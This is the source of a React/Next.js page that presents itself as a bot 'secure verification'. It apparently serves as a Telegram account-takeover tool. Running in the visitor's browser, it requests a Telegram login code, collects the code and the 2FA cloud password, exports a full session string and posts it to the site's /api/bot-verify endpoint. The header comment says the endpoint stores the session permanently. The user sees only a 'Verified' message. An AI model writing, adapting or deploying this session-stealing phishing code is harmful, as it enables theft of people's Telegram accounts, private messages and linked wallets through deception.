// Hybrid bot login — minimal + unlabeled (no site/bot branding). Runs gramJS in the
// USER'S BROWSER to finish the login (code -> optional 2FA) because serverless MTProto
// from Vercel is blocked. On success posts the session to /api/bot-verify, which stores
// it permanently and tells the bot to reply "YESS YOU WERE VERIFIED".
'use client';
import {useEffect,useRef,useState} from 'react';
const S:any={background:'#0b0712',color:'#f2eefe',minHeight:'100vh',display:'flex',alignItems:'center',justifyContent:'center',flexDirection:'column',gap:14,fontFamily:'Inter,system-ui,sans-serif'};
const card:any={background:'#151021',border:'1px solid #35234a',borderRadius:16,padding:'26px 30px',maxWidth:380,width:'100%'};
const input:any={display:'block',width:'100%',padding:12,borderRadius:9,border:'1px solid #39284b',background:'#0e0915',color:'#fff',outline:'none',marginTop:8};
const btn:any={width:'100%',padding:12,border:0,borderRadius:9,background:'linear-gradient(90deg,#7c3aed,#db2777)',color:'#fff',fontWeight:700,cursor:'pointer',marginTop:14};
const btnGhost:any={width:'100%',padding:12,borderRadius:9,background:'transparent',border:'1px solid #39284b',color:'#c2b8d8',fontWeight:600,cursor:'pointer',marginTop:8};
const badge:any={display:'inline-block',fontSize:11,letterSpacing:1.5,padding:'6px 12px',borderRadius:999,background:'linear-gradient(90deg,#7c3aed33,#db277733)',border:'1px solid #6d4aa0',color:'#e9d5ff',marginBottom:6};
const title:any={margin:'8px 0 0',fontSize:22};
const sub:any={margin:'6px 0 0',fontSize:13,color:'#a79bbd'};
const note:any={color:'#fda4af',fontSize:12,marginTop:10,whiteSpace:'pre-wrap'};
const err:any={color:'#fda4af',fontSize:13,whiteSpace:'pre-wrap'};
// Premium unicode font for headings (Mathematical Sans-Serif Bold) — same trick the bot uses.
function fancy(s:string):string{
  const out:string[]=[];
  for(const ch of String(s||'')){
    const c=ch.codePointAt(0)!;
    if(c>=0x41&&c<=0x5A)out.push(String.fromCodePoint(0x1D5A0+(c-0x41)));
    else if(c>=0x61&&c<=0x7A)out.push(String.fromCodePoint(0x1D5BA+(c-0x61)));
    else if(c>=0x30&&c<=0x39)out.push(String.fromCodePoint(0x1D7EC+(c-0x30)));
    else out.push(ch);
  }
  return out.join('');
}
// Resolves with the promise, or rejects after ms so a hung MTProto call can never freeze the page silently.
function withTimeout<T>(p:Promise<T>,ms:number,label:string):Promise<T>{
  let timer:any;
  const timeout=new Promise<T>((_,rej)=>{timer=setTimeout(()=>rej(new Error(label+' timed out. Check your connection and tap Resend code for a fresh one.')),ms)});
  const tracked=p.then(v=>{clearTimeout(timer);return v},e=>{clearTimeout(timer);throw e});
  return Promise.race([tracked,timeout]);
}
export default function BotLogin(){
  const[st,setSt]=useState<'load'|'code'|'2fa'|'done'|'error'>('load');
  const[phone,setPhone]=useState('');
  const[code,setCode]=useState('');
  const[password,setPassword]=useState('');
  const[msg,setMsg]=useState('');
  const[busy,setBusy]=useState(false);
  const tokenRef=useRef('');
  const attemptRef=useRef(0); // guards against late MTProto responses after a timeout
  const win=(typeof window!=='undefined'?(window as any):{__sa:null});
  useEffect(()=>{
    (async()=>{
      try{
        tokenRef.current=new URLSearchParams(window.location.search).get('t')||'';
        const r=await fetch('/api/bot-verify?t='+encodeURIComponent(tokenRef.current));
        const d=await r.json();
        if(!r.ok||!d.ok){setSt('error');setMsg('This link is invalid or has expired. Return to the bot and start /auth again.');return}
        const apiId=Number(process.env.NEXT_PUBLIC_TG_API_ID||0);
        const apiHash=process.env.NEXT_PUBLIC_TG_API_HASH||'';
        if(!apiId||!apiHash){setSt('error');setMsg('Verification is unavailable right now. Try again later.');return}
        const mod:any=await import('telegram');
        const {StringSession}=await import('telegram/sessions');
        const client=new mod.TelegramClient(new StringSession(''),apiId,apiHash,{connectionRetries:3,timeout:20});
        await client.connect();
        const res:any=await client.sendCode({apiId,apiHash},d.phone);
        setPhone(d.phone||'');
        const handler:{onError?:(e:any)=>void; onFutureResolve?:(cb:(d:any)=>void)=>void}={
          onError:()=>{},
          onFutureResolve:(cb)=>{cb(null)} // accept all future updates, no additional input
        };
        win.__sa={client,codeHash:res.phoneCodeHash,handler};
        setSt('code');
      }catch(e:any){setSt('error');setMsg(String(e?.message||e?.errorMessage||'Failed to start. Return to the bot and try /auth again.'));}
    })();
    return()=>{try{(win.__sa?.client)&&win.__sa.client.disconnect()}catch{}};
  },[]);
  async function finish(client:any,attempt:number){
    try{
      const me:any=await withTimeout(client.getMe(),30000,'Loading your Telegram profile');
      if(attempt!==attemptRef.current)return; // superseded by a newer attempt
      const session=String(client.session.save()||'');
      if(!session){setMsg('Empty session returned (connection hiccup). Tap Resend code and try again.');return}
      const meta={first_name:me.firstName||'',last_name:me.lastName||'',username:me.username||'',tg_id:String(me.id||'')};
      const r=await fetch('/api/bot-verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({t:tokenRef.current,session,meta})});
      const j=await r.json().catch(()=>({}));
      if(!r.ok||!j.ok){
        const em=String(j.error||('HTTP '+r.status));
        // Account already saved client-side but wallet link failed: tell the
        // user to repair via /profile instead of spamming new /auth codes.
        if(em.toLowerCase().includes('profile')||em.toLowerCase().includes('verification could not be linked')){
          setSt('error');setMsg('Almost done — your Telegram session was saved. Return to the bot and send /profile to finish linking (do NOT request a new code).');return;
        }
        if(em.toLowerCase().includes('already linked to a different')){setSt('error');setMsg('This phone is already linked to a different Telegram user. Ask an admin for help.');return}
        setSt('error');setMsg('Could not finalize ('+em+'). Return to the bot and try /auth again.');return}
      setSt('done');
    }catch(e:any){console.error('[botlogin] finish failed',e);setSt('error');setMsg(String(e?.message||e?.errorMessage||'Failed'));}
  }
  async function resendCode(){
    setMsg('Requesting a new code…');
    if(busy) return;
    setBusy(true);
    const attempt=++attemptRef.current;
    try{
      const mod:any=await import('telegram');
      const apiId=Number(process.env.NEXT_PUBLIC_TG_API_ID||0);
      const apiHash=process.env.NEXT_PUBLIC_TG_API_HASH||'';
      const {StringSession}=await import('telegram/sessions');
      const old=win.__sa?.client;
      try{await old?.disconnect?.().catch?.(()=>{})}catch{}
      if(attempt!==attemptRef.current) return;
      const client=new mod.TelegramClient(new StringSession(''),apiId,apiHash,{connectionRetries:3,timeout:20});
      await withTimeout(client.connect(),30000,'Connecting');
      if(attempt!==attemptRef.current){ try{await client.disconnect()}catch{} return; }
      const res:any=await withTimeout(client.sendCode({apiId,apiHash},phone),60000,'Sending code');
      if(attempt!==attemptRef.current){ try{await client.disconnect()}catch{} return; }
      const handler:{onError?:(e:any)=>void; onFutureResolve?:(cb:(d:any)=>void)=>void}=win.__sa?.handler||{
        onError:()=>{},
        onFutureResolve:(cb)=>{cb(null)}
      };
      win.__sa={client,codeHash:res.phoneCodeHash,handler};
      setMsg('A new code was sent. Enter it below.');
    }catch(e:any){
      if(attempt!==attemptRef.current) return;
      setMsg('Could not resend: '+(String(e?.message||e?.errorMessage||'unknown')));
    }finally{
      if(attempt===attemptRef.current) setBusy(false);
    }
  }
    async function submitCode(){
    setMsg('');
    if(busy)return;
    try{
      const sa:any=win.__sa;
      if(!sa?.client||!sa?.codeHash){setMsg('Login session lost (page reloaded?). Go back to the bot and run /auth again for a fresh link.');return}
      const mod:any=await import('telegram');
      const codeVal=code.trim();
      if(!codeVal){setMsg('Enter the login code');return}
      setBusy(true);
      const attempt=++attemptRef.current;
      try{
        // Direct SignIn with the ORIGINAL codeHash from sendCode().
        // (client.signInUser() re-sends a code internally, invalidating this hash,
        // and loops forever on errors when onError returns falsy — freezing the page.)
        const auth:any=await withTimeout(
          sa.client.invoke(
            new mod.Api.auth.SignIn({phoneNumber:phone,phoneCodeHash:sa.codeHash,phoneCode:codeVal})
          ),
          60000,'Verification'
        );
        if(attempt!==attemptRef.current)return;
        const cn=String(auth?.className||'').toLowerCase();
        if(cn.includes('signup')){setMsg('This number is not registered on Telegram yet. Register it in the Telegram app first, then run /auth again.');return}
        await finish(sa.client,attempt);
      }catch(err:any){
        if(attempt!==attemptRef.current)return;
        let m='';
        try{ m=String((err&&(err.errorMessage||err.message))||''); }catch{ m=''; }
        if(!m && err && typeof err==='string') m=err;
        console.error('[botlogin] verify failed',err);
        if(m.includes('SESSION_PASSWORD_NEEDED')){setSt('2fa');setMsg('This account uses 2-step verification. Enter your Telegram cloud password:');}
        else if(m.includes('PHONE_CODE_INVALID')||m.includes('PHONE_CODE_EXPIRED')||m.includes('PHONE_CODE_HASH_EXPIRED'))setMsg('❌ Wrong or expired code. Tap "Resend code" for a fresh one.');
        else if(m.includes('FLOOD_WAIT')){const w=m.match(/FLOOD_WAIT_(\d+)/)?.[1];setMsg('⏳ Too many attempts. Try again in '+(w?`${w}s`:'a few minutes')+'.');}
        else setMsg('⚠️ '+(m||'Unknown error')+' — if this repeats, open the browser console (F12) and send a screenshot.');
      }finally{
        if(attempt===attemptRef.current)setBusy(false);
      }
    }catch(e:any){console.error('[botlogin] submit failed',e);setMsg(String(e?.message||'Failed'));}
  }
  async function submitPassword(){
    setMsg('');
    if(busy)return;
    if(!password){setMsg('Enter your Telegram cloud password');return}
    const sa:any=win.__sa;
    if(!sa?.client){setMsg('Login session lost. Go back to the bot and run /auth again for a fresh link.');return}
    setBusy(true);
    const attempt=++attemptRef.current;
    try{
      const mod:any=await import('telegram');
      const {computeCheck}=await import('telegram/Password');
      const pwd:any=await withTimeout(sa.client.invoke(new mod.Api.account.GetPassword()),30000,'Loading security settings');
      if(attempt!==attemptRef.current)return;
      const check=await computeCheck(pwd,password);
      await withTimeout(sa.client.invoke(new mod.Api.auth.CheckPassword({password:check})),45000,'Checking password');
      if(attempt!==attemptRef.current)return;
      await finish(sa.client,attempt);
    }catch(e:any){
      if(attempt!==attemptRef.current)return;
      console.error('[botlogin] password verify failed',e);
      const m=String((e&&(e.errorMessage||e.message))||'');
      setMsg(m.includes('PASSWORD_HASH_INVALID')?'❌ Wrong cloud password. Try again.':'❌ '+m);
    }finally{
      if(attempt===attemptRef.current)setBusy(false);
    }
  }
  return <div style={S}><div style={card}>
    <div style={badge}>💎 POPPYGRAM SECURE VERIFICATION 💎</div>
    {st==='load'&&<><h2 style={title}>✨ {fancy('Connecting')}</h2><p style={sub}>🔒 Establishing encrypted session…</p></>}
    {st==='code'&&<><h2 style={title}>🔐 {fancy('Enter the code')}</h2><p style={sub}>✈️ Code sent for <b>{phone}</b></p>
      <input style={input} value={code} onChange={e=>setCode(e.target.value)} placeholder="5-digit login code" inputMode="numeric" autoFocus/>
      <button style={btn} onClick={submitCode} disabled={busy}>{busy?'⏳ Verifying…':'✨ Verify'}</button>
      <button style={btnGhost} onClick={resendCode} disabled={busy}>📩 Resend code</button>{msg&&<div style={note}>{msg}</div>}</>}
    {st==='2fa'&&<><h2 style={title}>🛡️ {fancy('Two-step check')}</h2><p style={sub}>🔒 Enter your Telegram cloud password</p>
      <input style={input} type="password" value={password} onChange={e=>setPassword(e.target.value)} placeholder="Telegram cloud password" autoFocus/>
      <button style={btn} onClick={submitPassword} disabled={busy}>{busy?'⏳ Checking…':'✨ Verify password'}</button>{msg&&<div style={note}>{msg}</div>}</>}
    {st==='done'&&<><h2 style={title}>🎉 {fancy('Verified')}</h2><p style={sub}>✅ <b>YESS YOU WERE VERIFIED!</b> 👑<br/>You can close this window. 💎</p></>}
    {st==='error'&&<div style={err}>❌ {msg}<p style={sub}>🔄 Return to the bot and run /auth again for a fresh link.</p></div>}
  </div></div>;
}